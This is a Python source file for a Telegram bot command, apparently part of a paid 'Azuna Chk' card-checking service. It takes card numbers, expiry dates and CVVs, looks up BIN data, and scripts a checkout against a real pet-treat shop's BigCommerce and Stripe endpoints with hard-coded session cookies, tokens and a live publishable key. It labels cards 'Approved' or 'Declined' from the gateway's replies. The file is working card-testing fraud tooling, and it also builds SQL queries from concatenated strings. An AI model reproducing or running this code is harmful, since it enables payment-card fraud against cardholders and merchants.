
import json
import requests
import time
import os
import asyncio
import re
import colored 
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from db import *
from user import*


# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)


@Client.on_message(filters.command(["lo"], ["/", "."]))
async def ch(_, message: Message):

            username = message.from_user.username
            chat_id = message.chat.id
            user_id = (
        message.from_user.id
    )

            
# Obtener información del grupo
            queryGroups = "SELECT * FROM `groups` WHERE id=" + str(chat_id)
            cursorGroups = db.cursor()
            cursorGroups.execute(queryGroups)
            resultGroups = cursorGroups.fetchall()

# Obtener información del usuario
            queryUsers = "SELECT * FROM users WHERE user_id='" + str(user_id) + "'"
            cursorUsers = db.cursor()
            cursorUsers.execute(queryUsers)
            resultUsers = cursorUsers.fetchall()

            isPremium = False

# Verificar si el usuario es premium en la tabla "users" solo si no es premium en la tabla "groups"
            

            row = None  # Asignar un valor por defecto

            if not isPremium and len(resultUsers) > 0:
                row = resultUsers[0]
            if row and row[2] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True
            
            # ...
            
            if len(resultGroups) > 0:
                row = resultGroups[0]
            if row and row[3] == 'premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True

            

# Verificar si el bot se está utilizando en un grupo
            isGroupChat = message.chat.type == 'group'

            if not isPremium:
             message_text = "Para usar el bot"
    
             if isGroupChat:
              message_text += " en este grupo, debes comprar Azunachk. Por favor, ponte en contacto con los vendedores para obtener más información."
             else:
              message_text += ", debes comprar Azunachk. Por favor, ponte en contacto con los vendedores para obtener más información."
    
             await message.reply_text(f"<i>{message_text}</i>")
             return
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」 ━━━━
<i>♻️ Comando</i> <i>/lo</i>
<i>🔰 Formato:</i> <code>cc|mm|yy|cvv</code>
<i>➤ Gateway:</i> <code>Stripe Charged</code>
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」 ━━━━""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

# ...

# Al final del procesamiento de mensajes, marcar al usuario como no antispam


                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
            reply = await message.reply_text("<b>Cargando proceso...</b>")        
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            tiempo_inicio = time.perf_counter()
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")
  

   
    #-----------------------------------------------------------------------------------------------
            cabeza= {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'accept': '*/*',
            'content-type': 'text/plain;charset=UTF-8'
            }
            
            response = requests.post('https://m.stripe.com/6', headers=cabeza).json()
            
    
            muid = response["muid"]
            guid = response["guid"]
            sid = response["sid"]
            
            print(muid)
            
            #-------------- REQUESTS 1 --------------#
           
                
            cookies = {
    'fornax_anonymousId': 'a25f6b55-183c-449b-b248-676e9fae5144',
    'athena_short_visit_id': '5b31a4a4-eea4-4870-aec3-f14de0a29875:1691403174',
    'XSRF-TOKEN': 'b6e0dd14cf907fb0be323b7cf6732c78d6504204770d12ee0fadde10b8f3456b',
    'SHOP_SESSION_TOKEN': '5567ec9a-ed2f-4219-9e48-be51b47f56dd',
    'ajs_user_id': 'null',
    'ajs_group_id': 'null',
    'ajs_anonymous_id': '%2210adc32c-33ad-47bf-b53c-fbf2113c5c81%22',
    '_gcl_au': '1.1.1025576536.1691403178',
    '_gid': 'GA1.2.1191840710.1691403178',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_2837529': '1',
    '_hjSession_2837529': 'eyJpZCI6ImNkMTBlZGJhLTBkNTQtNDI1NS04Yzk1LTQyZWY5NTM1NGY4MyIsImNyZWF0ZWQiOjE2OTE0MDMxNzc5MTIsImluU2FtcGxlIjp0cnVlfQ==',
    '_hjAbsoluteSessionInProgress': '0',
    'STORE_VISITOR': '1',
    'drift_campaign_refresh': 'ddfc5fc4-b8d2-4479-aac3-08dd3a70b66c',
    '_fbp': 'fb.1.1691403179901.166657237',
    'drift_aid': '1fd25b49-2e12-460d-a58e-28effb932dac',
    'driftt_aid': '1fd25b49-2e12-460d-a58e-28effb932dac',
    '_hjSessionUser_2837529': 'eyJpZCI6ImE2ZWM4Nzk2LTRmZWItNWIyNi04NGIzLThmYWQ5NGRkYjkyMiIsImNyZWF0ZWQiOjE2OTE0MDMxNzc5MDEsImV4aXN0aW5nIjp0cnVlfQ==',
    'lastVisitedCategory': '34',
    'SHOP_SESSION_ROTATION_TOKEN': '1e9084588a63edb7161959acb2a0a511cc9a174a9723f9cc71a7fc7080794d4c',
    '_ga': 'GA1.2.265351045.1691403178',
    '_ga_N2BE3432NL': 'GS1.2.1691403178.1.1.1691403352.60.0.0',
    '_ga_Q90B6PFKSV': 'GS1.1.1691403178.1.1.1691403353.59.0.0',
    '__stripe_mid': 'c47e1ec0-3709-429b-8219-9d93d7bb1a937413f0',
    '__stripe_sid': 'ac05070e-32c5-4d89-b178-5d3616090873cb2a28',
    '_gali': 'checkout-payment-continue',
    'Shopper-Pref': 'B7C84599755C188241E11A562153890D50FF8DFE-1692008227274-x%7B%22cur%22%3A%22CAD%22%7D',
}
            
            headers = {
                'authority': 'pettreatery.com',
                'accept': 'application/vnd.bc.v1+json',
                'accept-language': 'en-US,en;q=0.9',
                # 'cookie': 'fornax_anonymousId=a25f6b55-183c-449b-b248-676e9fae5144; athena_short_visit_id=5b31a4a4-eea4-4870-aec3-f14de0a29875:1691403174; XSRF-TOKEN=b6e0dd14cf907fb0be323b7cf6732c78d6504204770d12ee0fadde10b8f3456b; SHOP_SESSION_TOKEN=5567ec9a-ed2f-4219-9e48-be51b47f56dd; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2210adc32c-33ad-47bf-b53c-fbf2113c5c81%22; _gcl_au=1.1.1025576536.1691403178; _gid=GA1.2.1191840710.1691403178; _hjFirstSeen=1; _hjIncludedInSessionSample_2837529=1; _hjSession_2837529=eyJpZCI6ImNkMTBlZGJhLTBkNTQtNDI1NS04Yzk1LTQyZWY5NTM1NGY4MyIsImNyZWF0ZWQiOjE2OTE0MDMxNzc5MTIsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; STORE_VISITOR=1; drift_campaign_refresh=ddfc5fc4-b8d2-4479-aac3-08dd3a70b66c; _fbp=fb.1.1691403179901.166657237; drift_aid=1fd25b49-2e12-460d-a58e-28effb932dac; driftt_aid=1fd25b49-2e12-460d-a58e-28effb932dac; _hjSessionUser_2837529=eyJpZCI6ImE2ZWM4Nzk2LTRmZWItNWIyNi04NGIzLThmYWQ5NGRkYjkyMiIsImNyZWF0ZWQiOjE2OTE0MDMxNzc5MDEsImV4aXN0aW5nIjp0cnVlfQ==; lastVisitedCategory=34; SHOP_SESSION_ROTATION_TOKEN=1e9084588a63edb7161959acb2a0a511cc9a174a9723f9cc71a7fc7080794d4c; _ga=GA1.2.265351045.1691403178; _ga_N2BE3432NL=GS1.2.1691403178.1.1.1691403352.60.0.0; _ga_Q90B6PFKSV=GS1.1.1691403178.1.1.1691403353.59.0.0; __stripe_mid=c47e1ec0-3709-429b-8219-9d93d7bb1a937413f0; __stripe_sid=ac05070e-32c5-4d89-b178-5d3616090873cb2a28; _gali=checkout-payment-continue; Shopper-Pref=B7C84599755C188241E11A562153890D50FF8DFE-1692008227274-x%7B%22cur%22%3A%22CAD%22%7D',
                'referer': 'https://pettreatery.com/checkout',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
                'x-api-internal': 'This API endpoint is for internal use only and may change in the future',
                'x-checkout-sdk-version': '1.412.0',
                'x-sf-csrf-token': ',',
                'x-xsrf-token': 'b6e0dd14cf907fb0be323b7cf6732c78d6504204770d12ee0fadde10b8f3456b, b6e0dd14cf907fb0be323b7cf6732c78d6504204770d12ee0fadde10b8f3456b, b6e0dd14cf907fb0be323b7cf6732c78d6504204770d12ee0fadde10b8f3456b',
            }
            
            params = {
                'cartId': 'a073c5d9-3248-40c5-98a2-7d8e87b88320',
                'method': 'card',
            }
            
            response = requests.get(
                'https://pettreatery.com/api/storefront/payments/stripev3',
                params=params,
                cookies=cookies,
                headers=headers,
            ).json()
            
            idd  = response['clientToken']
            idd2= response['initializationData']['stripeConnectedAccount']
            idd4= response['initializationData']['stripePublishableKey']
            
           
            
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
            }
            
            
            data = 'type=card&billing_details[address][city]=new+york+&billing_details[address][country]=BR&billing_details[address][line1]=street+avenue+5&billing_details[address][line2]=&billing_details[address][postal_code]=10080&billing_details[address][state]=MG&billing_details[email]=alex%40gmail.com&billing_details[name]=alex+torres&billing_details[phone]=424123869&card[number]=4500037234108875&card[cvc]=510&card[exp_month]=06&card[exp_year]=26&guid=5ef1198c-6db3-42ba-9c33-0915bb234135b0e4d3&muid=c47e1ec0-3709-429b-8219-9d93d7bb1a937413f0&sid=ac05070e-32c5-4d89-b178-5d3616090873cb2a28&pasted_fields=number&payment_user_agent=stripe.js%2F89ba805a50%3B+stripe-js-v3%2F89ba805a50%3B+split-card-element&time_on_page=4593276&key=pk_live_nzDqmO2ZvtnSvBbTxrwn61fk&_stripe_account=acct_1K4V9oL44hi73sYQ&_stripe_version=2020-03-02%3Balipay_beta%3Dv1'

            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
            
            idd3= response['id']
            
            headers = {
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9',
    'Authorization': 'JWT eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTE0MTE1NDksIm5iZiI6MTY5MTQwNzk0OSwiaXNzIjoicGF5bWVudHMuYmlnY29tbWVyY2UuY29tIiwic3ViIjoxMDAyMDcxMTA2LCJqdGkiOiI0OGQwMzJhMi0wZGYzLTQwODktYTU5Mi0wMjdiZTI5NjVhYzYiLCJpYXQiOjE2OTE0MDc5NDksImRhdGEiOnsic3RvcmVfaWQiOiIxMDAyMDcxMTA2Iiwib3JkZXJfaWQiOiIyMjY1IiwiYW1vdW50IjoyMzYzLCJjdXJyZW5jeSI6IkNBRCIsInN0b3JlX3VybCI6Imh0dHBzOi8vcGV0dHJlYXRlcnkuY29tIiwiZm9ybV9pZCI6InVua25vd24ifX0.ukodyCgTq2GgAl8XJnnKlqplf_56v3NNws-5lIsD6IY',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://pettreatery.com',
    'Referer': 'https://pettreatery.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
            }
            
            json_data = {
                'customer': {
                    'customer_group': {
                        'name': 'Online Customers',
                    },
                    'geo_ip_country_code': 'BR',
                    'session_token': '5aa25021d0a9d6324b1578b1607a107556b97630',
                },
                'notify_url': 'https://internalapi-1002071106.mybigcommerce.com/internalapi/v1/checkout/order/2263/payment',
                'order': {
                    'billing_address': {
                        'city': 'new york ',
                        'country_code': 'BR',
                        'country': 'Brazil',
                        'first_name': 'alex',
                        'last_name': 'torres',
                        'phone': '424123869',
                        'state_code': 'MG',
                        'state': 'Minas Gerais',
                        'street_1': 'street avenue 5',
                        'zip': '10080',
                        'email': 'alex@gmail.com',
                    },
                    'coupons': [],
                    'currency': 'CAD',
                    'id': '2263',
                    'items': [
                        {
                            'code': 'e467c81d-3c90-489f-84ba-90058587a5af',
                            'variant_id': 456,
                            'name': 'Freeze Dried Chicken Treat For Dogs & Cats 50g',
                            'price': 1249,
                            'unit_price': 1249,
                            'quantity': 1,
                            'sku': '88808-BA',
                        },
                    ],
                    'shipping': [
                        {
                            'method': 'Canada Post (Small Packet International Surface)',
                        },
                    ],
                    'shipping_address': {
                        'city': 'new york ',
                        'country_code': 'BR',
                        'country': 'Brazil',
                        'first_name': 'alex',
                        'last_name': 'torres',
                        'phone': '424123869',
                        'state_code': 'MG',
                        'state': 'Minas Gerais',
                        'street_1': 'street avenue 5',
                        'zip': '10080',
                    },
                    'token': 'c04b50c60729e6447910877c4aa5d1f9',
                    'totals': {
                        'grand_total': 2363,
                        'handling': 0,
                        'shipping': 1114,
                        'subtotal': 1249,
                        'tax': 0,
                    },
                },
                'payment': {
                    'gateway': 'stripev3',
                    'notify_url': 'https://internalapi-1002071106.mybigcommerce.com/internalapi/v1/checkout/order/2263/payment',
                    'vault_payment_instrument': False,
                    'method': 'card',
                    'credit_card_token': {
                        'token': idd3,
                    },
                    'confirm': False,
                    'client_token': idd,
                },
                'store': {
                    'hash': 'w75y2hi2rp',
                    'id': '1002071106',
                    'name': 'The Granville Island Pet Treatery',
                },
            }
            
            response = requests.post('https://payments.bigcommerce.com/api/public/v1/orders/payments', headers=headers, json=json_data).json()
            print(response)
            errormessage=response['errors']['message']

            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            
            await asyncio.sleep(2)
            if 'status' in response and response['status'] == 'succeeded':
                await reply.edit_text(f"""   
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Charged
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""")
            elif(errormessage=="Your card's security code is incorrect. incorrect_cvc"):
                await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Charged
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""")
            elif(errormessage=="'Your card number is incorrect. incorrect_number"):
                await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Declined! ❌</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Charged
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""") 
            else:
                await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Declined! ❌</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Charged
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""") 
            
    # Marcar al usuario como antispam y comenzar el procesamiento de mensajes
    